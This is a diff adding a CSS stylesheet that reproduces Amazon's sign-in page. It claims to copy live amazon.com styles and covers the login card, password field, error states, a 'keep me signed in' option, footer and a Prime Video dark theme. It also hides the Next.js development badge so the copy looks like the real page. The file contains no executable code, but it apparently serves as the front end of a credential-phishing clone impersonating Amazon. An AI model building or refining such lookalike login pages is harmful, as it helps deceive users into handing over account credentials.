@@ -1,0 +1,913 @@
+/* ==========================================================================
+   AMAZON PRIME USA LOGIN - INCH-BY-INCH PRODUCTION SPECIFICATION
+   Extracted from live amazon.com/ap/signin production styles
+   ========================================================================== */
+
+/* Hide Next.js Dev Badge and Overlays */
+nextjs-portal,
+[data-nextjs-toast],
+[data-nextjs-dialog] {
+  display: none !important;
+}
+
+/* Page Wrapper */
+.amzn-page-wrapper {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+  background-color: #ffffff;
+  color: #0f1111;
+  padding: 0 0 32px 0;
+  position: relative;
+  transition: background-color 0.25s ease, color 0.25s ease;
+}
+
+/* Prime Video Dark Theme */
+.amzn-page-wrapper.dark {
+  background-color: #00050d;
+  color: #f2f4f8;
+  background: radial-gradient(circle at 50% 0%, #0e1724 0%, #00050d 100%);
+}
+
+.amzn-page-wrapper.dark .amzn-auth-card {
+  background-color: #141c24;
+  border-color: #232f3e;
+}
+
+.amzn-page-wrapper.dark .amzn-card-title,
+.amzn-page-wrapper.dark .amzn-form-label,
+.amzn-page-wrapper.dark .amzn-legal-text,
+.amzn-page-wrapper.dark .amzn-business-title,
+.amzn-page-wrapper.dark .amzn-checkbox-text,
+.amzn-page-wrapper.dark .amzn-identifier-value {
+  color: #f2f4f8;
+}
+
+.amzn-page-wrapper.dark .amzn-input {
+  background-color: #0c141f;
+  border-color: #3c4d62;
+  color: #ffffff;
+}
+
+.amzn-page-wrapper.dark .amzn-input:focus {
+  border-color: #00a8e1;
+  box-shadow: 0 0 0 3px rgba(0, 168, 225, 0.35);
+}
+
+.amzn-page-wrapper.dark .amzn-btn-primary {
+  background-color: #00a8e1;
+  border-color: #00a8e1;
+  color: #ffffff;
+}
+
+.amzn-page-wrapper.dark .amzn-btn-primary:hover {
+  background-color: #1aafe4;
+  border-color: #1aafe4;
+}
+
+.amzn-page-wrapper.dark .amzn-btn-secondary {
+  background-color: #1e2936;
+  border-color: #334458;
+  color: #f2f4f8;
+}
+
+.amzn-page-wrapper.dark .amzn-btn-secondary:hover {
+  background-color: #293747;
+}
+
+.amzn-page-wrapper.dark .amzn-link,
+.amzn-page-wrapper.dark .amzn-accordion-trigger,
+.amzn-page-wrapper.dark .amzn-details-link,
+.amzn-page-wrapper.dark .amzn-change-link {
+  color: #00a8e1;
+}
+
+.amzn-page-wrapper.dark .amzn-business-divider,
+.amzn-page-wrapper.dark .amzn-or-line {
+  background-color: #232f3e;
+}
+
+.amzn-page-wrapper.dark .amzn-footer-divider {
+  background: linear-gradient(to right, rgba(255, 255, 255, 0), rgba(255, 255, 255, 0.2), rgba(255, 255, 255, 0));
+}
+
+.amzn-page-wrapper.dark .amzn-footer-link {
+  color: #79b8ff;
+}
+
+.amzn-page-wrapper.dark .amzn-footer-copyright {
+  color: #8898aa;
+}
+
+/* ==========================================================================
+   DISCRETE FLOATING CONTROLS (Gear Icon in Top-Right)
+   ========================================================================== */
+.amzn-floating-control {
+  position: fixed;
+  top: 14px;
+  right: 18px;
+  z-index: 1000;
+}
+
+.amzn-floating-trigger {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  background: #ffffff;
+  border: 1px solid #d5d9d9;
+  padding: 4px 10px;
+  border-radius: 20px;
+  font-size: 11px;
+  font-weight: 600;
+  color: #555555;
+  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+  transition: all 0.15s ease;
+  cursor: pointer;
+}
+
+.amzn-page-wrapper.dark .amzn-floating-trigger {
+  background: #1e2936;
+  border-color: #334458;
+  color: #f2f4f8;
+}
+
+.amzn-floating-trigger:hover {
+  color: #111111;
+  background: #f7fafa;
+}
+
+.amzn-floating-menu {
+  position: absolute;
+  top: 34px;
+  right: 0;
+  width: 240px;
+  background: #ffffff;
+  border: 1px solid #d5d9d9;
+  border-radius: 8px;
+  padding: 12px;
+  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  animation: amznFadeIn 0.2s ease;
+}
+
+.amzn-page-wrapper.dark .amzn-floating-menu {
+  background: #141c24;
+  border-color: #232f3e;
+}
+
+.amzn-floating-section {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+.amzn-floating-heading {
+  font-size: 11px;
+  font-weight: 700;
+  color: #555555;
+  text-transform: uppercase;
+}
+
+.amzn-page-wrapper.dark .amzn-floating-heading {
+  color: #8898aa;
+}
+
+.amzn-floating-btn-group {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 4px;
+}
+
+.amzn-mini-btn {
+  padding: 4px 8px;
+  border: 1px solid #d5d9d9;
+  border-radius: 4px;
+  background: #ffffff;
+  color: #111111;
+  font-size: 11px;
+  font-weight: 500;
+  cursor: pointer;
+}
+
+.amzn-page-wrapper.dark .amzn-mini-btn {
+  background: #1e2936;
+  border-color: #334458;
+  color: #f2f4f8;
+}
+
+.amzn-mini-btn.active {
+  background: #ffd814;
+  border-color: #ffd814;
+  color: #0f1111;
+  font-weight: 700;
+}
+
+.amzn-page-wrapper.dark .amzn-mini-btn.active {
+  background: #00a8e1;
+  border-color: #00a8e1;
+  color: #ffffff;
+}
+
+.amzn-floating-footer {
+  display: flex;
+  justify-content: space-between;
+  padding-top: 8px;
+  border-top: 1px solid #eeeeee;
+}
+
+.amzn-page-wrapper.dark .amzn-floating-footer {
+  border-top-color: #232f3e;
+}
+
+.amzn-mini-reset {
+  color: #007185;
+  font-size: 11px;
+  cursor: pointer;
+  text-decoration: underline;
+}
+
+.amzn-mini-close {
+  color: #555555;
+  font-size: 11px;
+  cursor: pointer;
+}
+
+/* ==========================================================================
+   MAIN CONTENT AREA (Natural Responsive Flow)
+   ========================================================================== */
+.amzn-content-area {
+  width: 100%;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding-top: 18px;
+}
+
+/* ==========================================================================
+   HEADER & OFFICIAL LOGO
+   ========================================================================== */
+.amzn-header {
+  padding: 18px 0 18px 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.amzn-logo-link {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  padding: 4px;
+  outline: none;
+}
+
+.amzn-official-logo {
+  width: 103px;
+  height: 31px;
+  display: block;
+  object-fit: contain;
+}
+
+.prime-official-logo {
+  width: 128px;
+  height: 32px;
+  display: block;
+  object-fit: contain;
+}
+
+/* ==========================================================================
+   MAIN AUTH CARD (Matches Exact Amazon Computed Styles)
+   ========================================================================== */
+.amzn-main-container {
+  width: 100%;
+  max-width: 348px;
+  margin: 0 auto;
+  padding: 0;
+}
+
+.amzn-auth-card {
+  width: 348px;
+  background-color: #ffffff;
+  border: 1px solid #d5d9d9;
+  border-radius: 8px;
+  padding: 20px 26px;
+  box-shadow: none;
+  transition: all 0.2s ease;
+  margin: 0 auto;
+}
+
+.amzn-card-title {
+  font-family: Arial, sans-serif;
+  font-size: 28px;
+  font-weight: 400;
+  line-height: 1.25;
+  color: #0f1111;
+  margin-bottom: 14px;
+  letter-spacing: -0.3px;
+  padding-bottom: 4px;
+}
+
+/* ==========================================================================
+   USER IDENTIFIER PILL (Step 2)
+   ========================================================================== */
+.amzn-identifier-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 16px;
+  font-size: 13px;
+}
+
+.amzn-identifier-value {
+  color: #0f1111;
+  font-weight: 400;
+  word-break: break-all;
+}
+
+.amzn-change-link {
+  font-size: 13px;
+  font-weight: 400;
+  white-space: nowrap;
+  margin-left: 8px;
+  color: #007185;
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 0;
+  outline: none;
+  font-family: inherit;
+}
+
+.amzn-change-link:hover {
+  color: #c7511f;
+  text-decoration: underline;
+}
+
+/* ==========================================================================
+   ALERT BANNER (Error State)
+   ========================================================================== */
+.amzn-alert-box {
+  width: 348px;
+  margin: 0 auto 16px auto;
+  border: 1px solid #c40000;
+  border-radius: 4px;
+  background-color: #ffffff;
+  box-shadow: 0 0 0 1px #c40000 inset;
+  animation: amznFadeIn 0.25s ease-out;
+}
+
+.amzn-alert-container {
+  display: flex;
+  padding: 14px 18px;
+  align-items: flex-start;
+  gap: 12px;
+}
+
+.amzn-alert-icon-col {
+  flex-shrink: 0;
+  padding-top: 1px;
+}
+
+.amzn-alert-content {
+  flex: 1;
+}
+
+.amzn-alert-heading {
+  font-size: 17px;
+  font-weight: 700;
+  color: #c40000;
+  line-height: 1.25;
+  margin-bottom: 4px;
+}
+
+.amzn-alert-message {
+  font-size: 13px;
+  line-height: 19px;
+  color: #0f1111;
+}
+
+/* ==========================================================================
+   FORM CONTROLS & INPUTS
+   ========================================================================== */
+.amzn-form-group {
+  margin-bottom: 14px;
+  display: flex;
+  flex-direction: column;
+}
+
+.amzn-label-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 2px;
+}
+
+.amzn-form-label {
+  font-family: Arial, sans-serif;
+  font-size: 13px;
+  font-weight: 700;
+  line-height: 19px;
+  color: #0f1111;
+  margin-bottom: 4px;
+}
+
+.amzn-forgot-link {
+  font-size: 13px;
+  font-weight: 400;
+  color: #007185;
+}
+
+.amzn-input {
+  width: 100%;
+  height: 32px;
+  padding: 5px 11px;
+  background-color: #ffffff;
+  border: 1px solid #888c8c;
+  border-radius: 8px;
+  color: #0f1111;
+  font-family: Arial, sans-serif;
+  font-size: 14px;
+  outline: none;
+  box-shadow: none;
+  transition: all 0.15s ease;
+}
+
+.amzn-input:focus {
+  border-color: #007185;
+  box-shadow: 0 0 0 3px #c8f3fa, 0 1px 2px rgba(15, 17, 17, 0.15) inset;
+}
+
+.amzn-input.error {
+  border-color: #c40000;
+  box-shadow: 0 0 0 3px rgba(221, 97, 80, 0.2) inset, 0 0 0 1px #c40000;
+}
+
+.amzn-password-field-wrapper {
+  position: relative;
+  width: 100%;
+}
+
+.amzn-password-field-wrapper .amzn-input {
+  padding-right: 36px;
+}
+
+.amzn-password-toggle-btn {
+  position: absolute;
+  right: 6px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: #555555;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 4px;
+  border-radius: 3px;
+  cursor: pointer;
+}
+
+.amzn-password-toggle-btn:hover {
+  color: #111111;
+}
+
+.amzn-inline-error {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  margin-top: 5px;
+  color: #c40000;
+  font-size: 12px;
+  line-height: 15px;
+  animation: amznFadeIn 0.2s ease;
+}
+
+.amzn-inline-error-icon {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 14px;
+  height: 14px;
+  border-radius: 50%;
+  border: 1.5px solid #c40000;
+  font-size: 10px;
+  font-weight: 800;
+  line-height: 1;
+}
+
+/* ==========================================================================
+   BUTTONS (MODERN AMAZON PILL BUTTONS)
+   ========================================================================== */
+.amzn-btn-primary {
+  width: 100%;
+  height: 32px;
+  background-color: #ffd814;
+  border: 1px solid #ffd814;
+  border-radius: 100px;
+  color: #0f1111;
+  font-family: Arial, sans-serif;
+  font-size: 14px;
+  font-weight: 400;
+  line-height: 30px;
+  text-align: center;
+  box-shadow: none;
+  margin-top: 10px;
+  cursor: pointer;
+  transition: all 0.15s ease;
+}
+
+.amzn-btn-primary:hover {
+  background-color: #f7ca00;
+  border-color: #f2c200;
+}
+
+.amzn-btn-primary:active {
+  background-color: #f0b800;
+  border-color: #008296;
+}
+
+.amzn-btn-primary:focus-visible {
+  outline: none;
+  box-shadow: 0 0 0 3px #c8f3fa, 0 1px 2px rgba(15, 17, 17, 0.15) inset;
+}
+
+.amzn-btn-secondary {
+  width: 100%;
+  height: 32px;
+  background-color: #ffffff;
+  border: 1px solid #d5d9d9;
+  border-radius: 100px;
+  color: #0f1111;
+  font-family: Arial, sans-serif;
+  font-size: 14px;
+  font-weight: 400;
+  line-height: 30px;
+  text-align: center;
+  box-shadow: none;
+  cursor: pointer;
+  transition: all 0.15s ease;
+}
+
+.amzn-btn-secondary:hover {
+  background-color: #f7fafa;
+  border-color: #d5d9d9;
+}
+
+.amzn-btn-secondary:active {
+  background-color: #edfdff;
+  border-color: #008296;
+}
+
+/* ==========================================================================
+   LEGAL TERMS & ACCORDION
+   ========================================================================== */
+.amzn-legal-text {
+  font-size: 12px;
+  line-height: 1.5;
+  color: #0f1111;
+  margin-top: 18px;
+  margin-bottom: 18px;
+}
+
+.amzn-accordion {
+  margin-top: 14px;
+}
+
+.amzn-accordion-trigger {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  color: #007185;
+  font-size: 13px;
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 0;
+  outline: none;
+  font-family: inherit;
+}
+
+.amzn-accordion-arrow {
+  color: #555555;
+  transition: transform 0.2s ease;
+}
+
+.amzn-accordion-arrow.open {
+  transform: rotate(90deg);
+}
+
+.amzn-accordion-content {
+  margin-top: 8px;
+  margin-left: 16px;
+  animation: amznFadeIn 0.2s ease;
+}
+
+.amzn-help-links {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.amzn-help-links li a {
+  font-size: 13px;
+  color: #007185;
+}
+
+/* Business Section */
+.amzn-business-section {
+  margin-top: 22px;
+}
+
+.amzn-business-divider {
+  width: 100%;
+  height: 1px;
+  background-color: #e7e7e7;
+  margin-bottom: 14px;
+}
+
+.amzn-business-title {
+  font-size: 13px;
+  font-weight: 700;
+  color: #0f1111;
+  margin-bottom: 4px;
+}
+
+.amzn-business-link {
+  font-size: 13px;
+  color: #007185;
+}
+
+/* ==========================================================================
+   STEP 2 SPECIFICS
+   ========================================================================== */
+.amzn-keep-signed-in {
+  display: flex;
+  align-items: center;
+  justify-content: flex-start;
+  gap: 6px;
+  margin-top: 18px;
+  font-size: 13px;
+}
+
+.amzn-checkbox-label {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  cursor: pointer;
+  user-select: none;
+}
+
+.amzn-checkbox-input {
+  width: 15px;
+  height: 15px;
+  accent-color: #e77600;
+  cursor: pointer;
+}
+
+.amzn-checkbox-text {
+  color: #0f1111;
+  font-size: 13px;
+}
+
+.amzn-details-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 3px;
+  color: #007185;
+  font-size: 13px;
+  margin-left: 2px;
+  cursor: pointer;
+  background: none;
+  border: none;
+  padding: 0;
+  outline: none;
+  font-family: inherit;
+}
+
+.amzn-details-link:hover {
+  color: #c7511f;
+  text-decoration: underline;
+}
+
+.amzn-details-arrow {
+  color: #555555;
+}
+
+.amzn-or-divider {
+  display: flex;
+  align-items: center;
+  text-align: center;
+  margin: 18px 0;
+}
+
+.amzn-or-line {
+  flex: 1;
+  height: 1px;
+  background-color: #e7e7e7;
+}
+
+.amzn-or-text {
+  padding: 0 10px;
+  font-size: 12px;
+  color: #555555;
+}
+
+/* ==========================================================================
+   MODAL / POPOVER
+   ========================================================================== */
+.amzn-modal-overlay {
+  position: fixed;
+  inset: 0;
+  background-color: rgba(0, 0, 0, 0.45);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+  padding: 16px;
+  animation: amznFadeIn 0.2s ease;
+}
+
+.amzn-modal-card {
+  width: 100%;
+  max-width: 440px;
+  background-color: #ffffff;
+  border: 1px solid #d5d9d9;
+  border-radius: 8px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+  overflow: hidden;
+  animation: amznModalPop 0.25s ease-out;
+}
+
+@keyframes amznModalPop {
+  from {
+    transform: scale(0.95);
+    opacity: 0;
+  }
+  to {
+    transform: scale(1);
+    opacity: 1;
+  }
+}
+
+.amzn-modal-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px;
+  background-color: #f0f2f2;
+  border-bottom: 1px solid #d5d9d9;
+}
+
+.amzn-modal-title {
+  font-size: 16px;
+  font-weight: 700;
+  color: #0f1111;
+}
+
+.amzn-modal-close {
+  font-size: 18px;
+  color: #555555;
+  width: 28px;
+  height: 28px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+.amzn-modal-body {
+  padding: 20px;
+  font-size: 13px;
+  line-height: 1.6;
+  color: #0f1111;
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+
+.amzn-modal-footer {
+  padding: 12px 20px 16px 20px;
+  display: flex;
+  justify-content: flex-end;
+}
+
+.amzn-modal-done {
+  width: 80px;
+  height: 29px;
+  line-height: 27px;
+}
+
+/* ==========================================================================
+   FOOTER (Conditions of Use, Privacy Notice, Copyright)
+   ========================================================================== */
+.amzn-footer {
+  width: 100%;
+  max-width: 1000px;
+  margin: 32px auto 0 auto;
+  text-align: center;
+}
+
+.amzn-footer-divider {
+  width: 100%;
+  height: 1px;
+  background: linear-gradient(to right, rgba(0, 0, 0, 0), rgba(0, 0, 0, 0.15), rgba(0, 0, 0, 0));
+  margin-bottom: 26px;
+}
+
+.amzn-footer-links {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 24px;
+  margin-bottom: 10px;
+}
+
+.amzn-footer-link {
+  font-size: 11px;
+  line-height: 15px;
+  color: #0066c0;
+}
+
+.amzn-footer-link:hover {
+  color: #c7511f;
+  text-decoration: underline;
+}
+
+.amzn-footer-copyright {
+  font-size: 11px;
+  line-height: 15px;
+  color: #555555;
+}
+
+/* ==========================================================================
+   MOBILE RESPONSIVENESS (< 500px)
+   ========================================================================== */
+@media (max-width: 500px) {
+  .amzn-page-wrapper {
+    padding: 0 0 24px 0;
+  }
+
+  .amzn-header {
+    padding: 14px 0 16px 0;
+  }
+
+  .amzn-main-container {
+    max-width: 100%;
+    padding: 0;
+  }
+
+  .amzn-auth-card {
+    width: 100%;
+    border: none;
+    border-radius: 0;
+    padding: 0 18px 18px 18px;
+    background: transparent;
+  }
+
+  .amzn-alert-box {
+    width: calc(100% - 36px);
+    margin-left: 18px;
+    margin-right: 18px;
+  }
+
+  .amzn-card-title {
+    font-size: 24px;
+    margin-bottom: 14px;
+  }
+
+  .amzn-input {
+    height: 38px;
+    font-size: 15px;
+    padding: 6px 10px;
+  }
+
+  .amzn-btn-primary,
+  .amzn-btn-secondary {
+    height: 40px;
+    line-height: 38px;
+    font-size: 14px;
+  }
+
+  .amzn-footer {
+    margin-top: 24px;
+  }
+
+  .amzn-footer-links {
+    gap: 16px;
+  }
+}
+
+@keyframes amznFadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(-4px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
